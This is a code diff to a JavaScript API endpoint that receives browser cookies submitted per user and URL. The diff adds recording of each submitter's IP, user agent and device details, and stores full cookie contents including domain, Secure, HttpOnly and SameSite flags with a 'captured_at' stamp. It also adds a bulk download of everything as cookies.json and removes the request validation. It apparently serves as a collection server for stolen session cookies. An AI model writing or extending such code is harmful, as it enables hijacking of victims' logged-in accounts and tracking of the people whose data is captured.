@@ -35,6 +35,16 @@ function checkRateLimit(req) {
   return clientRequests.count <= rateLimit.maxRequests;
 }
 
+function getClientInfo(req) {
+  return {
+    ip: req.headers['x-forwarded-for'] || req.connection.remoteAddress,
+    userAgent: req.headers['user-agent'],
+    language: req.headers['accept-language'],
+    timestamp: new Date().toISOString(),
+    requestId: Math.random().toString(36).substring(7)
+  };
+}
+
 function validatePostData(body) {
   if (!body) return { isValid: false, error: 'Missing request body' };
   if (!body.userId) return { isValid: false, error: 'Missing userId' };
@@ -95,18 +105,31 @@ function handlePost(req, res) {
     }
   }
 
-  const validation = validatePostData(body);
-  if (!validation.isValid) {
-    return res.status(400).json({ error: validation.error });
-  }
-
+  const clientInfo = getClientInfo(req);
   const data = {
     id: Date.now().toString(),
     time: new Date().toISOString(),
     userId: body.userId,
     cookieCount: body.cookies ? body.cookies.length : 0,
     url: body.url,
-    body
+    deviceInfo: {
+      ...clientInfo,
+      platform: body.deviceInfo?.platform || 'unknown',
+      browser: body.deviceInfo?.browser || 'unknown',
+      os: body.deviceInfo?.os || 'unknown',
+      screen: body.deviceInfo?.screen || 'unknown'
+    },
+    cookies: body.cookies.map(cookie => ({
+      ...cookie,
+      captured_at: new Date().toISOString(),
+      domain_info: {
+        full_domain: cookie['Host raw'],
+        is_secure: cookie['Send for raw'] === 'true',
+        is_http_only: cookie['HTTP only raw'] === 'true',
+        same_site: cookie['SameSite raw']
+      }
+    })),
+    raw_data: body
   };
 
   // Limit array size to prevent memory issues
@@ -123,7 +146,7 @@ function handlePost(req, res) {
 }
 
 function handleGet(req, res) {
-  const { userId, limit } = req.query;
+  const { userId, limit, format } = req.query;
   let filteredPosts = posts;
 
   if (userId) {
@@ -132,6 +155,11 @@ function handleGet(req, res) {
 
   if (limit) {
     filteredPosts = filteredPosts.slice(0, parseInt(limit));
+  }
+
+  if (format === 'json') {
+    res.setHeader('Content-Disposition', 'attachment; filename=cookies.json');
+    res.setHeader('Content-Type', 'application/json');
   }
 
   res.status(200).json(filteredPosts);
